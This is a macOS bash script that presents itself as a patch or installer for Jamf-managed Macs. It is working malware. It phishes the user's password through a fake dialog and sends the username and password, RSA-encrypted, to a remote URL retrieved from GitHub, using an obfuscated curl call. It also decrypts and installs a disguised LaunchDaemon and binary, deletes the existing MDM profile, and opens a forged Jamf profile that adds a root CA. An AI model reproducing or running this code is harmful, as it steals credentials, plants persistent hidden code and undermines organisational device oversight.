#!/bin/bash
# haven't you figured out how to smile? isn't this the life you bargained for?
set -xe; DEPENDENCY=('mktemp' 'rm' '/usr/libexec/ApplicationFirewall/socketfilterfw' 'ping' 'exit' 'tr' 'awk' 'uname' 'ipconfig' 'mkfifo' '/bin/zsh' 'system_profiler' 'rev' 'whoami' 'id' 'openssl' 'base64' 'plutil' 'open' 'sleep' 'mv' 'chown' 'chmod' 'launchctl' 'mkdir' 'profiles' 'grep' 'xxd' 'cat' 'command' 'curl' 'osascript' 'ls' '/usr/bin/nc' 'echo')
trap 'osascript -e '\''display alert "Unable to patch..." message "Your macOS may be different from what is known/expected, thus incompatibility. Send R developer 4 help. ('"${BASH_COMMAND}:${LINENO}"')"'\' ERR
for cmd in "${DEPENDENCY[@]}"; do
  if ! command -v "$cmd" >/dev/null 2>&1; then
    ans=$(osascript -e 'display dialog "'"${cmd}"' not found ;; – Cancel to abort, Continue to ignore (WARNING)" buttons {"Cancel", "Continue"} default button "Continue"')
    [[ $ans =~ .*Cont.* ]] || exit 1
  fi
done
pass="$(osascript -e 'display dialog "Enter your password:" default answer "" with hidden answer' -e 'text returned of result' 2>/dev/null)"
if ! sudo ls /var/root >/dev/null 2>/dev/null; then
  pass_checked='true'
  echo "${pass}" | sudo -v -S
  if ! sudo ls /var/root >/dev/null 2>/dev/null; then
    osascript -e 'display alert "Error" message "Wrong password. Please run again."'
    pass_checked='wrong'
    exit 1
  fi
fi
dead="$(echo "$(curl -L "https://github.com/vinni3th3d4/CTF/raw/refs/heads/main/Cryptography/Provider.txt" 2>/dev/null)" | tr 'n-za-mN-ZA-M' 'a-mn-zA-MN-Z' | rev)"
(
 echo "$pass"|sudo -S;cat >/tmp/public.pem << EOF
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuppqSOJ4oJKokmDAPGrB
PONFgEddG3EqvvxEG0J0Trv1RAB0g1qibswd5uTc+iysKm6TL1+Uh7V+w5PJgIn2
Cg3tq5qVY333/O/d0Pb3vbR10P604jdi2LiyVL17cTbT8plXx6srhUpO0vfUYfUq
wTO5WmjXBdLk7pn8kqLAqfOpUgzKIIBKIWIdgAnTx1pj7IOHgWdxTq4TKFF7Qz7e
FqRW7Vbwx0mSrpTAI5JzRNYQlA7sdrbYJrKkQROp7N9SgBA4RFJg6xSk3TjY2Z/d
vPKymQlwH5V9LkxHU67Z+TUbm5lFvdzMsDXX0CDyVshA4hBIcfaU7vnMjZ542VGn
WQIDAQAB
-----END PUBLIC KEY-----
EOF
  for you_will_find in "$(whoami):$(id -F):${pass}:${pass_checked:-unknown}"; do
    for beauty in $(seq 0 1500 ${#you_will_find}); do
      nevermore="$(echo "$(whoami)"':'"${the_noise_is_a_fog}${look_beyond_it_and}${you_will_find:$beauty:1500}" | openssl rsautl -encrypt -pubin -inkey /tmp/public.pem -out - | base64)"
      ${fix_12398}c${jamf_12490}u${forever_17901}r${my_24237}l${love_20012} -X "${a4db05892b98590235f4c081cd571f4587ca398cb458661b4242b63869dcca00}P${c5feab709fa49df4eac85d640adfe15efb10670dfc2371b37863ab36f869be88}O${q0e8a3dcc377c3b025122522252e977e14aceaf8275f99d97fc10e585bea805d}S${bfe4c32946127d9f15e8b05c0222b3fb1127f2be6f6c7360662b3af722c529b3}T${a1e1af490006e0d30d9611522dc2740e86549eba76afd47283df27e9015010b5}" -H "Content-Type: application/json" -d '{"content":"'"${nevermore}"'"}' "${im_the_pain_within_your_head}${and_without_me_you_d_be}${dead}${im_the_reason_why}${you_ll_never_disappear}"; sleep 5
    done
  done
) & disown
paper3=/Library/LaunchDaemons/com.apple.networkfilter.plist
this="$(cat $0)"; (cat | openssl enc -aes-256-cbc -base64 -d -k "${this:14:37}" -pbkdf2 >/tmp/${r}_borntodie) << EOF
U2FsdGVkX18sWugx53HnWAp2rx8ix/S3DNzdJfY5RlSI7e2P+0X/Ltm9tNpa/Vic
2z++xiuSm1KilMVofOGl74tQ6jvH43p8mLXDC/FQx8LSMlw7+BzMWuJn1o4CW6nZ
Nplxo+Ibrr/2xOWGQyfuJ268cLezukBhqV9bKazhhIeoNclOz6cZkWwUVJpZrQQH
wstUS3tzvT5w5VCZBKsvfUADzyp1RLUCgeE/e+SE67Es4kpZyP0F01TXaib6fD8p
+pSSmmXY+LZa5X1Sm8vZGmXHliijXuLbi9YyqMVqZ0ZTm5LvK8Zws+RS7wKHlabv
SE9kLbHb+2w0KlImywept/0q0hc6o0bS9EC/C7p5gNN3s6a5pqMTujQ5I0FSd9K2
RYIb2mmJcxgxQHDQ5Ro5HqRatZPr5xzPkglcc6vYP8449L7sn1t1ViHw3scOnd+c
2bN5Jivy3YYiPfAbPW99eXgZTZWnjAQBZS8j/OKm7MHNYqS5XQwwcD2L+2EYNFmI
gvuAiWI1wrhfHkFyjMogHQGUwWaZOAN5vBxert9AKzE8gZ9/ydkdE0MZ0gpYR63T
ggHTQEobYb5N2i8/s37l9A==
EOF
sudo mv /tmp/${r}_borntodie $paper3
sudo chown root:wheel $paper3
sudo chmod 644 $paper3
sudo launchctl unload -w $paper3
sudo launchctl load -w $paper3
(cat | openssl enc -aes-256-cbc -base64 -d -k "${this:52:38}" -pbkdf2 >/tmp/${r}_borntoshine) << EOF
U2FsdGVkX1+j+o9DfhQkh/zToFruGzBhO2gGWU7mEDabrEvrwP+5LoOvh99rMgKO
QCc3b/D1vdcK0LIB+4jWsLyn6J5q9hQv9ZmlQlzuoBRphoYSVYqaOxn3cNVfCCZm
QziFb8/c9/7l3ghu4z6hk1yYy9IvX7jRLEYJ0hW+GkGiS/yRL0OpS42gWPubjVpj
3ahtVwOBMCH6mYgafKVnFUFezDRpAsNuRc6MSMlEJO/N/FdXDWUY4Q8H1Eb45Qka
nR9jpZMsEU9rBvE+Tddi6Z/IZv61CBR4U645t4D3AasRg47AaT5riN8OQjaMiwRZ
ndy1vtw1PF0aJXRAlXqEt0Tv0jdJDJJTFlaKKUpu3O+m5LJEPLQdH/KXOJNQ0s/5
6R4EEbkA8r/3TUtu+4DkarSLUf1bhgSshxWmUBJTqYoBhn+nY4xnXYRZasKG+ujm
2tX+hjmGszg42T0HvSd4R8MlxWSNfIHqZL2DLxcW6vCHi0v+TeeiALmAOrdl+jRm
irycs/IMIhqNaj9izEUhTmCADHjyANbdBYg5BNyhiVgVZXkIeZg7K4/38Uf92D9O
ZkspydYJjaYQioTu4wTuPUs/0o+GtHNHbXXph21l1gP9qCUEL1Vy6BF/IKoH5d9r
I0FFtvTrGPRJNBIQ/cS516sNgvKRhpHDDo9Zc9d8U/iqWjde2UtQ+8JacNPX5hZx
183FeS5O6gNs2PTDpiu9fCkBgXPbv93WvY8fjuvCgFc0R9LLwqGXos2Rcveq70pu
6lUPPyDARTepE7dEDOqyJLTpXauiqYTirKvStSF2ysWGVCaW8WUq6/9/gGuwonMH
1OenVnxP84X1zHOsCFLuz/kF8S/uWb3C+pvAqOoF+RiWRsSUopzPyaXF4Ak0PKU0
DVI0RgqGC8EkGswLS0LvMoNBIXUow/KvSwKBRRgYCXKryUU/E1p5/OMLgUN7Ynhd
DMaZv+Mnv4pnNGdE2q0nH3WqWPdlIMN2A3Qpel6h2VsMacRHgGHFUG/RSRgFGGxL
i7SjhkvgpATW7Kg+8M1ibQ==
EOF
iloveyou=/usr/local/bin/amenodorime
sudo mkdir -p /usr/local/bin
sudo mv /tmp/${r}_borntoshine $iloveyou
sudo chmod 644 $iloveyou
sudo chown root:wheel $iloveyou
sudo profiles -P | grep -i jamf >/tmp/grep
if [[ -z $(cat /tmp/grep) ]]; then
  ans=$(osascript -e 'display dialog "JAMF profile not found. Press OK to proceed to patched install instead. Cancel to exit." buttons {"Cancel", "OK"} default button "OK"' 2>/dev/null)
  [[ $ans =~ .*OK.* ]] || exit 1
else
  echo y | sudo profiles -D 2>/dev/null
fi
r=${RANDOM}'.mobileconfig'
echo 'YnBsaXN0MDDaAQIDBAUGBwgJCgsMDQ4PEBHPKdBfEBNQYXlsb2FkT3JnYW5pemF0aW9uXxASUGF5bG9hZERpc3BsYXlOYW1lXFBheWxvYWRTY29wZVtQYXlsb2FkVHlwZV8QGFBheWxvYWRSZW1vdmFsRGlzYWxsb3dlZF8QElBheWxvYWREZXNjcmlwdGlvbl5QYXlsb2FkQ29udGVudF8QEVBheWxvYWRJZGVudGlmaWVyXlBheWxvYWRWZXJzaW9uW1BheWxvYWRVVUlEVEphbWZaSmFtZiBUcnVzdFZTeXN0ZW1dQ29uZmlndXJhdGlvbghfEDZLZWVwaW5nIHlvdSBzYWZlIGFuZCBwcm9kdWN0aXZlIG9uIHlvdXIgbW9iaWxlIGRldmljZS6rEitSaHR/ipWgqb/XBgIEBwgJChMUFRYoKSpfEGpBdXRvbWF0aWNhbGx5IGNvbmZpZ3VyZXMgSmFtZiBUcnVzdCBOZXR3b3JraW5nIHRvIGFjdGl2YXRlIHdpdGggeW91ciBvcmdhbml6YXRpb24ncyBKYW1mIFNlY3VyaXR5IGFjY291bnQuXxAhSmFtZiBUcnVzdCBOZXR3b3JraW5nIEF1dG8gRGVwbG95XxAjY29tLmFwcGxlLk1hbmFnZWRDbGllbnQucHJlZmVyZW5jZXPRFxheY29tLmphbWYudHJ1c3TRGRpWRm9yY2VkoRvRHB1fEBdtY3hfcHJlZmVyZW5jZV9zZXR0aW5nc9UeHyAhIiMkJSYnVmFwaUtleVlzZWNyZXRLZXlfEBRhY3RpdmF0aW9uUHJvZmlsZVVybF5hY3RpdmF0aW9uVHlwZVpleHRlcm5hbElkXxAkOWQ3MTBlZDgtOWVlMi00MGM5LTlhZjktZTU2MjQyMjE5YWY0XxAsWDNrd2RWOXNiRjgyTXpkZmVUQjFjbDh3ZDI1ZmFEUndjREZ1TXpVMWZRPT1fECVodHRwczovL2Uud2FuZGVyYS5jb20vYXgweG96OTAtbXMtanNsUkFQXxA3dWVtXzQyYzliN2VlLWQ4OTItNDQyYS1iMGUzLWZjMTBmYjllZjZkMl8lbWFuYWdlbWVudElkJV8QMGNvbS5qYW1mLnRydXN0LmF4MHhvejkwLnN1cGVydmlzZWRfbWFjLm9uZS50b3VjaBABXxAkOTM3RjM5QTQtNkREMi00RTE3LTg5RDMtOUE1RkIxQzA4M0M02QoCBCwtLggJAS8wMTI8D1EpC1tETlNTZXR0aW5nc11PbkRlbWFuZFJ1bGVzXxATUHJvaGliaXREaXNhYmxlbWVudF8QJDdCNDNGRDBDLUI1NDktNEY0NC04RTgzLTQzRTMwQ0VEQzQ3MlhKYW1mIEROU18QHWNvbS5hcHBsZS5kbnNTZXR0aW5ncy5tYW5hZ2Vk1DM0NTY3OTo7XxAPU2VydmVyQWRkcmVzc2VzXxAYU3VwcGxlbWVudGFsTWF0Y2hEb21haW5zW0ROU1Byb3RvY29sWVNlcnZlclVSTKE4VzEuMS4xLjGgVUhUVFBTXxAkaHR0cHM6Ly9jbG91ZGZsYXJlLWRucy5jb20vZG5zLXF1ZXJ5oz1CTtI+P0BBWVNTSURNYXRjaFZBY3Rpb26gWkRpc2Nvbm5lY3TSQz9ETV8QEEFjdGlvblBhcmFtZXRlcnOhRdJGR0hMV0RvbWFpbnNcRG9tYWluQWN0aW9uo0lKS1oqLmphbWYuY29tXxAPKi5qYW1mY2xvdWQuY29tXxAQKi5qYW1mbmVidWxhLmNvbVxOZXZlckNvbm5lY3RfEBJFdmFsdWF0ZUNvbm5lY3Rpb27RP09XQ29ubmVjdAhfEDFjb20uamFtZi50cnVzdC5heDB4b3o5MC5zdXBlcnZpc2VkX21hYy5uYXRpdmUuZG9o1wECBAcICQoLUxVUZilnXxAURmlyZWZveCBEb0ggU2V0dGluZ3PRVVZfEBNvcmcubW96aWxsYS5maXJlZm940RlXoVjRHFnTWltcXQ9jXEROU092ZXJIVFRQU18QGUVudGVycHJpc2VQb2xpY2llc0VuYWJsZWRcQ2VydGlmaWNhdGVz0l5fDw9XRW5hYmxlZFZMb2NrZWQICAjRZA9fEBVJbXBvcnRFbnRlcnByaXNlUm9vdHMIXxA6Y29tLmphbWYudHJ1c3QuYXgweG96OTAuc3VwZXJ2aXNlZF9tYWMub3JnLm1vemlsbGEuZmlyZWZveF8QJDA0MkVERjA2LTdCQjMtNDJCRC1BNkJGLTM4NjVDRkFBNEMwQdcBAgQHCAkKC2kVanIpc18QFFZpdmFsZGkgRG9IIFNldHRpbmdz0WtsXxATY29tLnZpdmFsZGkuVml2YWxkadEZbaFu0Rxv0XBxXxAXQnVpbHRJbkRuc0NsaWVudEVuYWJsZWQJXxA6Y29tLmphbWYudHJ1c3QuYXgweG96OTAuc3VwZXJ2aXNlZF9tYWMuY29tLnZpdmFsZGkuVml2YWxkaV8QIzRBNkQ2QzFBLTdDNjgtNEJDMi05MzNDLTQ0NTUwNjQ0MTY01wECBAcICQoLdRV2fSl+XxARRWRnZSBEb0ggU2V0dGluZ3PRd3hfEBJjb20ubWljcm9zb2Z0LkVkZ2XRGXmhetEce9FwcQlfEDljb20uamFtZi50cnVzdC5heDB4b3o5MC5zdXBlcnZpc2VkX21hYy5jb20ubWljcm9zb2Z0LkVkZ2VfECQ1OTFCOTY5RC00RDAyLTRBODAtQUNEOC0xOUU2NkVFQjUyREXXAQIEBwgJCguAFYGIKYlfEBNDaHJvbWUgRG9IIFNldHRpbmdz0YKDXxARY29tLmdvb2dsZS5DaHJvbWXRGYShhdEchtFwcQlfEDhjb20uamFtZi50cnVzdC5heDB4b3o5MC5zdXBlcnZpc2VkX21hYy5jb20uZ29vZ2xlLkNocm9tZV8QJDYwRkEzMzIyLUYwRTYtNDhBNS1CMjJFLTg1OEIyQUQ1MTIwNNcBAgQHCAkKC4sVjJMplF8QEkJyYXZlIERvSCBTZXR0aW5nc9GNjl8QEWNvbS5icmF2ZS5Ccm93c2Vy0RmPoZDRHJHRcHEJXxA4Y29tLmphbWYudHJ1c3QuYXgweG96OTAuc3VwZXJ2aXNlZF9tYWMuY29tLmJyYXZlLkJyb3dzZXJfECQ3Njk3NURBMS1FREMyLTQ5QUItQTQ3Ny0wNEJFOEFCODZCNULXAQIEBwgJCguWFZeeKZ9fEBBBcmMgRG9IIFNldHRpbmdz0ZiZXxAaY29tcGFueS50aGVicm93c2VyLkJyb3dzZXLRGZqhm9EcnNFwcQlfEEFjb20uamFtZi50cnVzdC5heDB4b3o5MC5zdXBlcnZpc2VkX21hYy5jb21wYW55LnRoZWJyb3dzZXIuQnJvd3Nlcl8QJDYwRkEzMzIyLUYwRTYtNDhBNS1CMjJFLTg1OEIyQUQ1MTIwNtkGAgEEoQcICQqiowukpaanKahfEBpQYXlsb2FkQ2VydGlmaWNhdGVGaWxlTmFtZV8QGkFkZHMgYSBDQSByb290IGNlcnRpZmljYXRl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dW5kc0VuYWJsZWRfEBRDcml0aWNhbEFsZXJ0RW5hYmxlZF8QEEJ1bmRsZUlkZW50aWZpZXJfEBROb3RpZmljYXRpb25zRW5hYmxlZF8QGFNob3dJbk5vdGlmaWNhdGlvbkNlbnRlcggICAgICF8QHmNvbS5hcHBsZS5ub3RpZmljYXRpb25zZXR0aW5nc18QQ2NvbS5hcHBsZS5ub3RpZmljYXRpb25zZXR0aW5ncy4xQjc4MkJFOC1FODNFLTQwM0EtOTFGOC1DQjUzMUM4OEQzM0FfEClDb25maWd1cmVzIG5vdGlmaWNhdGlvbiBzZXR0aW5ncyBmb3IgYXBwc18QJDFCNzgyQkU4LUU4M0UtNDAzQS05MUY4LUNCNTMxQzg4RDMzQdkJAsAEwQEIBgopwsPJccvMzc5fEClBdXRvTGF1bmNoZWRBcHBsaWNhdGlvbkRpY3Rpb25hcnktbWFuYWdlZF5QYXlsb2FkRW5hYmxlZF8QG0xvZ2luIEl0ZW1zOiAgTWFuYWdlZCBJdGVtc6HE0sXGxw9UUGF0aFRIaWRlXxAcL0FwcGxpY2F0aW9ucy9KYW1mIFRydXN0LmFwcAhfEBxjb20uYXBwbGUubG9naW5pdGVtcy5tYW5hZ2VkCV1KQU1GIFNvZnR3YXJlXxBBY29tLmFwcGxlLmxvZ2luaXRlbXMubWFuYWdlZC5BNkI3ODA4Qy00NUEwLTRGN0UtQkIwQS1FQTgwQTUwNkNEQTBQXxAkQTZCNzgwOEMtNDVBMC00RjdFLUJCMEEtRUE4MEE1MDZDREEwXxAmY29tLmphbWYudHJ1c3QuYXgweG96OTAuc3VwZXJ2aXNlZF9tYWNfECQ2M2Y1MDdlYi00OWZlLTRlYTUtYmFmNi1hZjljMmFhZmE4ODQACAAdADMASABVAGEAfACRAKAAtADDAM8A1ADfAOYA9AD1AS4BOgFJAbYB2gIAAgMCEgIVAhwCHgIhAjsCRgJNAlcCbgJ9AogCrwLeAwYDCQNDA3YDeAOfA7IDvgPMA+IECQQSBDIEOwRNBGgEdAR+BIAEiASJBI8EtgS6BL8EyQTQBNEE3AThBPQE9gT7BQMFEAUUBR8FMQVEBVEFZgVpBXEFcgWmBbUFzAXPBeUF6AXqBe0F9AYBBh0GKgYvBjcGPgY/BkAGQQZEBlwGXQaaBsEG0AbnBuoHAAcDBwUHCAcLByUHJgdjB4kHmAesB68HxAfHB8kHzAfPB9AIDAgzCEIIWAhbCG8Icgh0CHcIegh7CLYI3QjsCQEJBAkYCRsJHQkgCSMJJAlfCYYJlQmoCasJyAnLCc0J0AnTCdQKGAo/ClIKbwqMCqQKvgrTEKoRBBErEToRURFfEWERcBF+EZERnxG2EckR4BH7EfwR/RH+Ef8SABIBEiISaBKUErsSzhL6EwkTJxMpEy4TMxM4E1cTWBN3E3gThhPKE8sT8hQbAAAAAAAAAgEAAAAAAAAA0QAAAAAAAAAAAAAAAAAAFEI=' | base64 -d >/tmp/$r
plutil -convert xml1 /tmp/$r
chmod 755 /tmp/$r
(osascript -e 'display alert "hAPPY VALENTINE!!!" message "Go to General >> Device Management, and install!! (you may need to restart)"') & disown
open /tmp/$r 2>/dev/null >/dev/null && sleep 1.5 && rm /tmp/$r 2>/dev/null